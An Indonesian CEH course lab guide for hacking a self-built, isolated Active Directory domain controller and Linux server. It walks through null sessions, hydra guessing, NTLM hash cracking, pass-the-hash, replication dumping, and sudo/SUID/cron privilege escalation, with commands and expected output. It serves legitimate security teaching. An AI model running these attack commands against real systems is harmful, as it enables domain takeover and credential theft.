# Lab 03 - System hacking dan Active Directory

Modul CEH 06 - System Hacking | 90 menit | Level 3

## Yang dibuktikan di lab ini

Anda masuk ke sebuah domain Active Directory tanpa modal apa pun selain alamat
IP-nya, lalu keluar dengan hak Domain Admin, dan Anda bisa menunjuk persis di
langkah mana pertahanan domain itu jebol. Setelah itu Anda melakukan hal yang
sama di sebuah server Linux, tiga kali, lewat tiga salah konfigurasi yang
berbeda.

Ini menyentuh dua bagian exam sekaligus. Modul 04 Enumeration menyumbang null
session, RID cycling, dan enumerasi LDAP. Modul 06 System hacking menyumbang
password cracking, pass-the-hash, dan privilege escalation. Soal exam
mencampur keduanya dalam satu skenario, dan lab ini juga.

## Peringatan dan batas

Yang boleh Anda serang di lab ini cuma dua container yang disebut di tabel
Peta lab. Tidak ada yang lain.

Ini bukan imbauan. Jaringan lab dibuat internal, jadi dari dalam toolbox tidak
ada jalan keluar sama sekali: bukan ke internet, bukan ke jaringan kelas,
bukan ke laptop peserta lain. Kalau Anda mengarahkan nmap ke subnet kelas,
nmap menjawab "failed to determine route" dan nol host discan. Itu perilaku
yang benar, bukan kerusakan.

Empat port yang dibuka ke laptop Anda semuanya diikat ke 127.0.0.1, jadi
Domain Controller ini tidak terlihat oleh siapa pun di jaringan kantor
Course-Net.

Sandi, hash, dan nama akun di lab ini karangan. Jangan pernah memakai nilai
yang sama di sistem sungguhan.

## Sebelum Senin, kerjakan ini di rumah

Lab ini satu-satunya yang membangun targetnya sendiri. Domain Controller
di sini bukan image jadi, dia dibangun di laptop Anda dari `dc/Dockerfile`.

```
./lab build            # toolbox, sekali saja untuk semua lab
./lab up 03            # build Domain Controller lalu nyalakan
./lab down 03
```

Yang perlu Anda tahu:

| | |
|---|---|
| Sekali build DC | sekitar 1 sampai 3 menit dengan internet kencang |
| Tarikan Docker Hub yang terpakai | 1, yaitu image dasar `servercontainers/samba` |
| Sisanya | paket Alpine, tidak kena batas 100 tarikan per jam Docker Hub |
| Pakai disk | sekitar 300 MB di atas image dasar |

Build cuma terjadi sekali. Setelah itu `./lab up 03` nyala dalam beberapa
detik. Kalau Anda baru membangun pertama kali di kelas, Anda menghabiskan
waktu latihan untuk menunggu.

Kenapa dibangun, bukan ditarik jadi: image `servercontainers/samba` apa adanya
cuma file server, di dalamnya tidak ada `samba-tool` dan tidak ada daemon yang
menjalankan peran Domain Controller. Yang mengubahnya jadi DC adalah paket
`samba-dc`, dan itu dipasang saat build. Penjelasan panjangnya ada di komentar
`dc/Dockerfile`.

## Menyalakan

```
./lab up 03          # macOS, Linux
.\lab.cmd up 03      # Windows
```

Terminal penyerang: `./lab sh 03`

Semua langkah wajib dikerjakan dari dalam terminal itu. Port yang dibuka ke
laptop Anda ada untuk memeriksa dan untuk menyambungkan perkakas GUI, bukan
untuk mengerjakan labnya.

| Port di laptop Anda | Menuju |
|---|---|
| 8345 | SMB di DC |
| 8389 | LDAP di DC |
| 8336 | LDAPS di DC |
| 8322 | SSH di victim |

## Peta lab

| Container | Perannya | Alamat dari dalam toolbox |
|---|---|---|
| toolbox | tempat Anda mengetik | - |
| dc | Domain Controller CEHLAB.LOCAL | `dc` atau `dc1.cehlab.local` |
| victim | server Linux srv-akuntansi | `victim` port 2222 |

Dari dalam toolbox, panggil target memakai NAMANYA, bukan localhost.
`smbclient -L //dc/` jalan, `smbclient -L //localhost/` tidak jalan.
Alasannya: setiap container punya localhost sendiri.

Domainnya: realm `CEHLAB.LOCAL`, nama NetBIOS `CEHLAB`, DC bernama `DC1`.

Berkas bantu ada di `/lab/files/` di dalam toolbox:

| Berkas | Isi |
|---|---|
| `/lab/files/pengguna.txt` | daftar UPN untuk hydra |
| `/lab/files/kandidat.txt` | 40 kandidat sandi |

## Langkah wajib

### 1. Pemetaan layanan

```
nmap -sS -sV -p 53,88,135,139,389,445,464,636,3268 --version-light dc
```

Yang mestinya kelihatan:

```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain
88/tcp   open  kerberos-sec (server time: ...)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Samba smbd 4
389/tcp  open  ldap         (Anonymous bind OK)
445/tcp  open  netbios-ssn  Samba smbd 4
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap     (Anonymous bind OK)
3268/tcp open  ldap         (Anonymous bind OK)
```

Kombinasi 88, 389, 445, dan 3268 adalah sidik jari Domain Controller. Kalau
soal exam menyebut host dengan port 88 dan 3268 terbuka, jawabannya DC, bukan
file server biasa.

<details><summary>Kalau macet, buka ini</summary>

`0 hosts up` berarti container DC belum selesai bangun. DC ini butuh sekitar
10 detik sebelum LDAP menjawab. Tunggu, lalu ulangi. Masih gagal setelah satu
menit, jalankan `./lab reset 03`.
</details>

### 2. Null session enumeration

Null session artinya masuk ke SMB dengan nama pengguna kosong dan sandi
kosong. Perhatikan berapa banyak yang bisa Anda ambil tanpa satu pun
kredensial.

```
smbclient -N -L //dc/
```

Yang mestinya kelihatan:

```
	Sharename       Type      Comment
	---------       ---- 	  -------
	sysvol          Disk
	netlogon        Disk
	backup          Disk      Arsip tim backup
	IPC$            IPC       IPC Service (Samba 4.23.8)
```

Share `backup` itu bukan bawaan Active Directory. Catat namanya.

```
rpcclient -U "" -N dc -c "lsaquery;enumdomusers"
```

Yang mestinya kelihatan:

```
Domain Name: CEHLAB
Domain Sid: S-1-5-21-4243737725-743501896-4607180
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[magang] rid:[0x44f]
user:[bkupadm] rid:[0x450]
user:[jdoe] rid:[0x451]
user:[asmith] rid:[0x452]
user:[svc_sql] rid:[0x453]
```

Domain SID di laptop Anda akan berbeda dari contoh di atas, karena dibuat
sendiri waktu build. RID-nya sama.

Terakhir, perkakas yang merangkum semuanya:

```
enum4linux-ng -A dc
```

Yang mestinya kelihatan, di bagian RPC Session Check:

```
[+] Server allows authentication via username '' and password ''
```

<details><summary>Kalau macet, buka ini</summary>

`NT_STATUS_ACCESS_DENIED` di semua perintah berarti Anda salah ketik nama
host. Targetnya `dc`, bukan `DC1` dan bukan alamat IP laptop Anda.
</details>

### 3. Tebakan sandi online

Anda punya delapan nama pengguna dan nol sandi. Coba tebak lewat LDAPS.

```
hydra -L /lab/files/pengguna.txt -P /lab/files/kandidat.txt -t 4 -s 636 ldap3s://dc
```

Yang mestinya kelihatan, sekitar 7 detik kemudian:

```
[DATA] max 4 tasks per 1 server, overall 4 tasks, 280 login tries (l:7/p:40)
[636][ldap3] host: dc   login: magang@cehlab.local   password: Password1
1 of 1 target successfully completed, 1 valid password found
```

Satu dari tujuh. Ini penting dan bukan kebetulan: sandi yang lain memang
tidak ada di wordlist. Tebakan online cuma menemukan akun yang sandinya
persis ada di daftar Anda.

<details><summary>Kenapa lewat LDAPS, bukan SMB</summary>

Modul `smb` di hydra 9.7 mensyaratkan SMBv1, dan Domain Controller ini menolak
SMBv1. Keluarannya `[ERROR] target smb://dc:445/ does not support SMBv1`. Itu
bukan kerusakan lab, itu memang pengerasan yang sudah lama jadi bawaan.
Bind LDAPS memakai sandi yang sama dengan SMB, jadi hasilnya setara.
</details>

### 4. RID cycling

Setiap akun punya nomor RID di ujung SID domain. RID cycling berarti menghitung
naik dari 500 dan menerjemahkan tiap SID jadi nama.

```
enum4linux-ng -u magang -p Password1 -R -r 500-520,1100-1112 dc
```

Yang mestinya kelihatan:

```
[+] Found user 'CEHLAB\Administrator' (RID 500)
[+] Found user 'CEHLAB\Guest' (RID 501)
[+] Found user 'CEHLAB\krbtgt' (RID 502)
[+] Found domain group 'CEHLAB\Domain Admins' (RID 512)
...
[+] Found user 'CEHLAB\magang' (RID 1103)
[+] Found user 'CEHLAB\bkupadm' (RID 1104)
[+] Found user 'CEHLAB\jdoe' (RID 1105)
[+] Found user 'CEHLAB\asmith' (RID 1106)
[+] Found user 'CEHLAB\svc_sql' (RID 1107)
[+] Found domain group 'CEHLAB\Helpdesk' (RID 1108)
[+] Found 8 user(s), 12 group(s), 0 machine(s) in total
```

Hafalkan tiga RID ini, keluar di exam: 500 Administrator, 501 Guest, 502
krbtgt, 512 Domain Admins. Akun buatan manusia mulai dari 1000 ke atas.

<details><summary>Kalau hasilnya nol dan Anda pakai null session</summary>

Coba jalankan perintah yang sama tanpa `-u` dan `-p`. Hasilnya nol temuan.
Itu benar, bukan salah ketik: DC ini mengizinkan enumerasi lewat SAMR secara
anonim (itu yang Anda pakai di langkah 2), tapi menolak penerjemahan SID lewat
LSA secara anonim. Jadi RID cycling di sini butuh satu kredensial apa saja,
sekecil apa pun haknya. Di banyak AD Windows yang lama, dua-duanya terbuka
anonim, dan itulah alasan teknik ini masuk kurikulum.
</details>

### 5. Enumerasi LDAP

Pertama, tanpa kredensial. Yang selalu terbuka di semua Active Directory
adalah rootDSE.

```
ldapsearch -x -H ldap://dc -s base -b "" defaultNamingContext dnsHostName supportedSASLMechanisms
```

Yang mestinya kelihatan:

```
dn:
defaultNamingContext: DC=cehlab,DC=local
dnsHostName: DC1.cehlab.local
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: NTLM
```

Sekarang coba baca isi domainnya, masih tanpa kredensial:

```
ldapsearch -x -H ldap://dc -b "DC=cehlab,DC=local" "(objectClass=user)" sAMAccountName
```

Yang mestinya kelihatan: `result: 1 Operations error`, nol entri. Anonim cuma
dapat rootDSE, tidak lebih.

Sekarang pakai kredensial dari langkah 3, masih di port 389:

```
ldapsearch -x -H ldap://dc -D "magang@cehlab.local" -w Password1 -b "DC=cehlab,DC=local" "(sAMAccountName=magang)" dn
```

Yang mestinya kelihatan:

```
ldap_bind: Strong(er) authentication required (8)
	additional info: BindSimple: Transport encryption required.
```

Ini bukan kegagalan Anda. DC menolak simple bind di jalur yang tidak
terenkripsi, karena sandi akan lewat sebagai teks polos. Pindah ke LDAPS.

### 6. Enumerasi LDAPS

```
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://dc:636 \
  -D "magang@cehlab.local" -w Password1 \
  -b "DC=cehlab,DC=local" "(objectCategory=person)" sAMAccountName description
```

Yang mestinya kelihatan, delapan akun lengkap dengan keterangannya:

```
sAMAccountName: magang
description: Anak magang, akun sementara
sAMAccountName: bkupadm
description: Operator backup
sAMAccountName: svc_sql
description: Service account SQL Server
```

`LDAPTLS_REQCERT=never` dipakai karena sertifikat DC ini dibuat sendiri dan
tidak ditandatangani CA mana pun. Di pentest sungguhan Anda akan sering
memakainya juga, dan itu sekaligus temuan yang layak dilaporkan.

Sekarang cari siapa yang berkuasa:

```
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://dc:636 \
  -D "magang@cehlab.local" -w Password1 -b "DC=cehlab,DC=local" \
  "(memberOf=CN=Domain Admins,CN=Users,DC=cehlab,DC=local)" sAMAccountName
```

Yang mestinya kelihatan:

```
sAMAccountName: Administrator
sAMAccountName: bkupadm
```

Dan cari akun yang punya Service Principal Name, karena itu penanda service
account:

```
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://dc:636 \
  -D "magang@cehlab.local" -w Password1 -b "DC=cehlab,DC=local" \
  "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
```

Yang mestinya kelihatan, di antara SPN milik DC1 sendiri:

```
sAMAccountName: svc_sql
servicePrincipalName: MSSQLSvc/sql.cehlab.local:1433
```

Simpan temuan itu. Kita kembali ke sana di bagian Yang tidak bisa dikerjakan.

Sampai di sini Anda tahu targetnya siapa: `bkupadm`, Domain Admin, dan sandinya
tidak jatuh ke hydra.

### 7. Ambil dan pecahkan hash NTLM

Ingat share `backup` dari langkah 2. Sekarang Anda punya kredensial.

```
mkdir -p /root/kerja && cd /root/kerja
smbclient -U "CEHLAB\magang%Password1" //dc/backup -c "ls; get audit-ntds-2025.txt"
cat audit-ntds-2025.txt
```

Yang mestinya kelihatan:

```
# Sisa pekerjaan audit internal 2025.
# Diminta dihapus setelah laporan disetujui. Belum dihapus.
Administrator:500:aad3b435b51404eeaad3b435b51404ee:76c69081cda424c2fcae99785e11e472:::
bkupadm:1104:aad3b435b51404eeaad3b435b51404ee:da7a868ae3207455a709066b8fdab1f6:::
jdoe:1105:aad3b435b51404eeaad3b435b51404ee:1fcecf3b307f7e390adbe18c2a527071:::
svc_sql:1107:aad3b435b51404eeaad3b435b51404ee:33e1e7ab5869dd64b9f375fe829567f6:::
```

Format ini namanya pwdump: `nama:RID:hash LM:hash NT:::`. Bagian LM semuanya
`aad3b435b51404eeaad3b435b51404ee`, dan itu nilai tetap yang artinya LM hash
kosong alias tidak dipakai. Yang berguna kolom keempat, itu NT hash.

Pecahkan dengan john. Pertama dengan wordlist apa adanya:

```
grep -v "^#" audit-ntds-2025.txt > hash-ntlm.txt
john --format=NT --wordlist=/lab/files/kandidat.txt hash-ntlm.txt
```

Yang mestinya kelihatan: nol yang jebol.

```
0g 0:00:00:00 DONE (...) 0g/s 444.4p/s 444.4c/s 1777C/s Password1..Temporary1
```

Sekarang nyalakan aturan mangling. Aturan mengubah tiap kata jadi ribuan
turunan: huruf besar, angka di belakang, tanda baca di ujung, dan seterusnya.

```
john --format=NT --wordlist=/lab/files/kandidat.txt --rules=Jumbo hash-ntlm.txt
john --format=NT --show hash-ntlm.txt
```

Yang mestinya kelihatan:

```
Backup2026!      (bkupadm)
1g 0:00:00:00 DONE (...) 782786p/s
...
bkupadm:Backup2026!:1104:aad3b435b51404eeaad3b435b51404ee:da7a868ae3207455a709066b8fdab1f6:::
1 password hash cracked, 3 left
```

Perhatikan angkanya: 40 kandidat jadi lebih dari 780 ribu tebakan per detik,
dan yang jebol adalah sandi yang TIDAK ada di wordlist. Kata dasarnya ada,
tanda serunya tidak. Ini beda mendasar antara tebakan online di langkah 3 dan
cracking offline di sini, dan exam suka menanyakannya.

Tiga hash lain tetap selamat. Itu memang seharusnya.

<details><summary>Kalau john bilang "No password hashes loaded"</summary>

Anda lupa membuang baris komentar. john membaca baris yang diawali `#` sebagai
hash rusak. Jalankan `grep` di atas dulu.

Kalau john menjawab "No such file or directory" untuk wordlist, berarti Anda
mengetiknya dari luar container. Semua langkah dikerjakan setelah
`./lab sh 03`.
</details>

Catatan untuk exam: nama yang paling sering keluar di soal cracking GPU itu
`hashcat`, dan Anda harus tahu namanya. Di lab ini hashcat tidak dipakai
karena container tidak punya akses driver OpenCL, jadi hashcat selalu menjawab
"No devices found". john mengerjakan hal yang sama di CPU.

### 8. Pass-the-hash

Anda sudah punya sandi bkupadm, jadi Anda bisa login biasa. Jangan. Buktikan
dulu bahwa HASH-nya saja sudah cukup, tanpa tahu sandinya.

```
H=da7a868ae3207455a709066b8fdab1f6
smbclient --pw-nt-hash -U "CEHLAB\bkupadm%$H" -L //dc/
```

Yang mestinya kelihatan: daftar share yang sama, artinya autentikasi berhasil
padahal yang Anda ketik adalah hash, bukan sandi.

```
smbclient --pw-nt-hash -U "CEHLAB\bkupadm%$H" //dc/sysvol -c "cd cehlab.local; ls"
```

Yang mestinya kelihatan:

```
  Policies                            D        0  ...
  scripts                             D        0  ...
```

Dan lewat RPC:

```
rpcclient --pw-nt-hash -U "CEHLAB\bkupadm%$H" dc -c "getusername"
```

Yang mestinya kelihatan:

```
Account Name: bkupadm, Authority Name: CEHLAB
```

Inilah kenapa NTLM disebut cacat rancangan, bukan cuma sandi yang lemah.
Protokolnya memang cuma butuh hash. Mengganti sandi menyelesaikan masalah,
tapi selama hash lama masih dipegang penyerang dan sandinya belum diganti,
hash itu setara sandi.

### 9. Masuk ke server Linux

Sandi dipakai ulang lintas sistem. Coba kredensial `magang` di server Linux.

```
ssh -p 2222 magang@victim
```

Sandinya `Password1`. Setelah masuk:

```
id
hostname
```

Yang mestinya kelihatan:

```
uid=1000(magang) gid=1000(users) groups=1000(users)
srv-akuntansi
```

### 10. Privilege escalation Linux, tiga jalur

Kerjakan ketiganya. Di exam, soalnya menanyakan cara mengenali, bukan cuma
cara mengeksploitasi.

#### Jalur A, salah konfigurasi sudo

```
sudo -l
```

Yang mestinya kelihatan:

```
User magang may run the following commands on srv-akuntansi:
    (root) NOPASSWD: /usr/bin/awk
```

awk kelihatan tidak berbahaya, sampai Anda ingat awk punya `system()`.

```
sudo awk 'BEGIN{system("/bin/sh")}'
id
cat /root/bukti-root.txt
```

Yang mestinya kelihatan:

```
uid=0(root) gid=0(root) groups=0(root),...
CEH-LAB-03 root di victim tercapai
```

Keluar dengan `exit` sebelum lanjut ke jalur B.

#### Jalur B, bit SUID di biner yang salah

```
find / -perm -4000 -type f 2>/dev/null
```

Yang mestinya kelihatan, di antara yang wajar seperti `passwd` dan `sudo`:

```
/usr/bin/find
```

`find` tidak seharusnya SUID. Dan `find` punya `-exec`, yang ikut jalan
sebagai pemilik biner.

```
find /etc/shadow -exec cat {} \; | head -3
```

Yang mestinya kelihatan, baris hash root yang normalnya cuma bisa dibaca root:

```
root:$6$...:20671:0:::::
```

Awalan `$6$` berarti SHA-512 crypt. Hafalkan penanda ini, keluar di exam:
`$1$` MD5, `$5$` SHA-256, `$6$` SHA-512, `$2y$` bcrypt.

#### Jalur C, cron root menjalankan skrip yang bisa ditulis siapa saja

```
cat /etc/crontabs/root
ls -la /opt/backup/backup.sh
```

Yang mestinya kelihatan:

```
* * * * * /opt/backup/backup.sh
-rwxrwxrwx 1 root root 111 ... /opt/backup/backup.sh
```

Perhatikan `rwxrwxrwx`. Skripnya milik root, dijalankan root, tapi siapa pun
boleh menulis ke situ.

```
echo 'echo "magang ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> /opt/backup/backup.sh
```

Tunggu satu menit penuh, lalu:

```
sudo -l
sudo id
```

Yang mestinya kelihatan:

```
    (ALL) NOPASSWD: ALL
uid=0(root) gid=0(root) ...
```

<details><summary>Kalau setelah semenit belum berubah</summary>

Periksa `cat /var/log/backup.log`. Kalau isinya bertambah tiap menit, cron
jalan dan berarti baris yang Anda tambahkan yang salah kutip. Periksa dengan
`tail -3 /opt/backup/backup.sh`, barisnya harus utuh satu baris.
</details>

### 11. Bukti

Salin ini ke catatan Anda.

```
domain          : CEHLAB.LOCAL
domain SID      :
akun jebol hydra:
NT hash bkupadm :
sandi bkupadm   :
bukti PTH       :
tiga jalur privesc yang saya kerjakan:
```

## Ceklis, diisi sendiri

- [ ] Saya bisa menyebutkan empat port yang menandai sebuah host adalah DC
- [ ] Saya tahu apa yang bisa dan tidak bisa diambil lewat null session di DC ini
- [ ] Saya bisa menjelaskan kenapa hydra cuma dapat satu akun sementara john dapat akun yang lain
- [ ] Saya bisa menjelaskan kenapa simple bind ditolak di 389 tapi diterima di 636
- [ ] Saya berhasil masuk memakai hash saja, tanpa mengetik sandi
- [ ] Saya mengerjakan ketiga jalur privilege escalation, bukan satu
- [ ] Saya tahu mitigasi tiap langkah, bukan cuma perintahnya

## Pertanyaan

Jawabannya cuma ada kalau Anda benar-benar mengerjakan langkahnya.

1. Berapa Domain SID di laptop Anda, dan kenapa berbeda dari contoh di README
   ini padahal Dockerfile-nya sama persis?
2. Di langkah 2, `enumdomusers` berhasil tanpa kredensial. Di langkah 4, RID
   cycling gagal tanpa kredensial. Dua-duanya enumerasi akun. Antarmuka RPC
   mana yang dipakai masing-masing, dan kenapa yang satu terbuka sementara
   yang lain tertutup?
3. Hydra mencoba 280 kombinasi dan menemukan satu. john dengan aturan Jumbo
   mencoba lebih dari 780 ribu per detik. Kenapa hydra tidak bisa secepat itu,
   padahal daftar sandinya sama?
4. Berapa RID `bkupadm` di laptop Anda, dan apakah cocok dengan RID di berkas
   `audit-ntds-2025.txt`? Apa artinya kalau di pentest sungguhan Anda menemukan
   dump yang RID-nya tidak cocok dengan domain yang sedang Anda uji?
5. Di langkah 8 Anda login memakai hash. Kalau administrator domain mengganti
   sandi bkupadm besok pagi, apakah hash yang Anda pegang masih berguna?
   Jelaskan alasannya, bukan cuma ya atau tidak.
6. Di jalur C, kenapa memberi izin `rwxrwxrwx` ke satu berkas skrip efeknya
   setara memberi root ke semua pengguna mesin itu?
7. Tiga akun di dump tidak pernah jebol. Apa yang bisa Anda simpulkan tentang
   sandi mereka, dan apa yang TIDAK boleh Anda simpulkan?

## Tantangan tambahan

Buat yang sudah selesai lebih cepat. Urut dari yang paling gampang.

1. **Pecahkan sandi root di victim.** Anda sudah punya isi `/etc/shadow` dari
   jalur B. Simpan baris root ke berkas, lalu jalankan john tanpa
   `--format=NT`. john mengenali `$6$` sendiri. Sandinya ada di
   `/lab/files/kandidat.txt` apa adanya, jadi tidak perlu aturan.

2. **Cari sandi bkupadm dengan cara lain.** Alih-alih `--rules=Jumbo`, pakai
   mode hybrid: `john --format=NT --wordlist=/lab/files/kandidat.txt
   --mask="?w?s" hash-ntlm.txt`. `?w` berarti kata dari wordlist, `?s` berarti
   satu karakter simbol. Bandingkan jumlah tebakannya dengan Jumbo, lalu
   jelaskan kapan Anda memilih mask dan kapan memilih rules.

3. **Brute force SSH.** Anda menemukan sandi victim lewat pemakaian ulang.
   Buktikan hydra juga bisa: `hydra -l magang -P /lab/files/kandidat.txt -s
   2222 ssh://victim`. Catat berapa lama, lalu bandingkan dengan langkah 3.

4. **Replikasi direktori, versi yang beneran jalan.** Ini yang di Windows
   disebut DCSync. Coba dulu sebagai magang:

   ```
   net rpc vampire keytab /tmp/x.keytab -S dc -U "CEHLAB\magang%Password1"
   ```

   Hasilnya `Failed to get NC Changes: Replication access was denied.`
   Sekarang sebagai bkupadm:

   ```
   net rpc vampire keytab /tmp/dc.keytab -S dc -U "CEHLAB\bkupadm%Backup2026!"
   ```

   Hasilnya `Vampired 50 accounts to keytab /tmp/dc.keytab`. Anda baru saja
   menyalin basis data direktori dari DC lewat DRSUAPI. Yang menentukan
   berhasil atau tidak bukan sandi Anda, tapi hak
   DS-Replication-Get-Changes-All di ACL objek domain, dan hak itu melekat di
   Domain Admins. Jelaskan kenapa kontrol ini lebih penting daripada memperkuat
   sandi.

5. **Petakan pertahanannya.** Untuk setiap langkah 2 sampai 8, tulis satu
   kalimat mitigasi yang bisa dikerjakan admin domain. Yang paling sulit
   dijawab dengan benar adalah langkah 8, dan itu memang inti soalnya.

## Yang tidak bisa dikerjakan di lab ini, dan kenapa

Bagian ini bukan basa-basi. Tiga teknik di bawah ini keluar di exam, dan Anda
tidak bisa melatihnya di sini. Kalau Anda mencoba lalu gagal, itu bukan Anda
yang salah dan bukan lab yang rusak.

### AS-REP roasting

Teknik ini menyerang akun yang atribut `userAccountControl`-nya menyalakan bit
`DONT_REQ_PREAUTH`. Untuk akun seperti itu, KDC mau mengirim AS-REP tanpa
minta bukti apa pun, dan bagian terenkripsi AS-REP itu bisa dibawa pulang lalu
dipecahkan offline. Perkakas bakunya `GetNPUsers.py` dari impacket, dan format
hasilnya `$krb5asrep$`.

Kenapa tidak bisa di sini: toolbox lab ini tidak punya klien Kerberos sama
sekali (`kinit`, `klist`, `kvno` tidak ada satu pun) dan tidak punya
`GetNPUsers.py`. Paket `python3-impacket` di Kali memasang pustakanya saja,
bukan skrip contohnya. Jadi perkakas untuk mencobanya memang tidak tersedia.

Apakah KDC Samba akan berperilaku sama dengan KDC Windows kalau perkakasnya
ada, tidak diuji waktu lab ini disusun, jadi di sini tidak diklaim apa pun
soal itu. Yang pasti cuma satu: di lab ini teknik itu tidak dijalankan.

Di AD Windows asli: cari akunnya dengan filter LDAP
`(userAccountControl:1.2.840.113556.1.4.803:=4194304)`, lalu jalankan
GetNPUsers, lalu pecahkan `$krb5asrep$` dengan john atau hashcat. Yang menarik,
langkah pencariannya bisa Anda latih di sini, karena filter LDAP-nya jalan:

```
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://dc:636 \
  -D "magang@cehlab.local" -w Password1 -b "DC=cehlab,DC=local" \
  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
```

Di lab ini hasilnya nol entri, karena tidak ada akun yang dibuat begitu.

### Kerberoasting

Teknik ini meminta tiket layanan (TGS) untuk sebuah SPN. Bagian tiket itu
dienkripsi dengan hash sandi akun pemilik SPN, jadi siapa pun yang punya satu
kredensial domain valid bisa memintanya lalu memecahkannya offline. Perkakas
bakunya `GetUserSPNs.py`, hasilnya `$krb5tgs$`.

Kenapa tidak bisa di sini: alasan yang sama persis, tidak ada klien Kerberos
dan tidak ada `GetUserSPNs.py` di toolbox. Sama seperti AS-REP roasting, apa
yang akan terjadi kalau perkakasnya ada tidak diuji, jadi tidak diklaim.

Yang bisa Anda latih di sini adalah separuh pertamanya, yaitu menemukan
sasarannya. Anda sudah melakukannya di langkah 6: `svc_sql` memegang
`MSSQLSvc/sql.cehlab.local:1433`. Di dunia nyata, akun itulah yang Anda
Kerberoast, dan service account memang sering bersandi lama dan tidak pernah
diganti.

### DCSync, versi impacket

Yang disebut DCSync di kurikulum adalah `secretsdump.py -just-dc` atau
`lsadump::dcsync` di mimikatz. Penyerang berpura-pura jadi Domain Controller,
meminta replikasi, dan menerima seluruh hash NTLM domain termasuk krbtgt.

Kenapa tidak bisa di sini: pembungkus `impacket-secretsdump` di toolbox rusak
karena cara Kali mengemas paketnya. Ini keluarannya apa adanya:

```
python3: can't open file '/usr/share/doc/python3-impacket/examples/secretsdump.py':
[Errno 2] No such file or directory
```

Tapi berhati-hatilah menarik kesimpulan yang salah dari situ. Yang rusak
perkakasnya, BUKAN targetnya. Protokol replikasi DRSUAPI di DC ini hidup dan
bisa dipakai, dan Anda bisa membuktikannya sendiri lewat tantangan tambahan
nomor 4. Jadi kalimat yang benar untuk lab ini adalah "saya tidak punya
perkakas DCSync di sini", bukan "DC ini kebal DCSync".

### Ringkasnya

| Teknik | Di lab ini | Di AD Windows sungguhan |
|---|---|---|
| Null session enumeration | jalan | jalan di domain lama, sudah ditutup di yang baru |
| RID cycling | jalan, butuh satu kredensial | sering jalan bahkan anonim di domain lama |
| Enumerasi LDAP dan LDAPS | jalan | jalan, ini roti sehari-hari |
| Pass-the-hash | jalan | jalan, sampai hari ini |
| Cracking NTLM offline | jalan | jalan |
| AS-REP roasting | tidak, perkakasnya tidak ada | jalan kalau ada akun tanpa preauth |
| Kerberoasting | tidak, perkakasnya tidak ada | jalan, hampir selalu |
| DCSync ala impacket | tidak, pembungkusnya rusak | jalan kalau Anda Domain Admin |
| Replikasi DRSUAPI | jalan, lewat `net rpc vampire keytab` | jalan, mekanisme yang sama |

## Nyambung ke exam

Empat port ini menandai Domain Controller: 88 Kerberos, 389 LDAP, 445 SMB,
3268 Global Catalog. Kalau soal menyebut kombinasi itu, jawabannya DC.

RID yang wajib hafal: 500 Administrator, 501 Guest, 502 krbtgt, 512 Domain
Admins. Akun buatan manusia mulai 1000.

LM hash `aad3b435b51404eeaad3b435b51404ee` artinya LM kosong, bukan sandi
kosong. Format pwdump `nama:RID:LM:NT:::`.

Pass-the-hash bekerja karena NTLM memakai hash sebagai bahan autentikasi,
bukan sebagai wakil sandi. Mitigasinya bukan sandi yang lebih panjang,
melainkan mematikan NTLM, memakai Kerberos, dan menerapkan tiering akun admin.

Penanda algoritma di `/etc/shadow`: `$1$` MD5, `$5$` SHA-256, `$6$` SHA-512,
`$2y$` bcrypt.

Tiga jalur privilege escalation Linux yang paling sering keluar: entri sudo
yang terlalu longgar untuk biner yang bisa menjalankan perintah lain, bit SUID
di biner yang tidak seharusnya, dan pekerjaan terjadwal milik root yang
menjalankan berkas yang bisa ditulis pengguna biasa.

## Membereskan

```
./lab down 03
```

Perintah itu menghapus container beserta datanya, jadi semua perubahan yang
Anda buat di dalam lab hilang. Salin dulu catatan Anda ke luar kalau perlu.

Image `ceh-dc:1.0` tetap tersimpan supaya `./lab up 03` berikutnya cepat.
Kalau Anda ingin membuangnya sekalian:

```
docker image rm ceh-dc:1.0
```
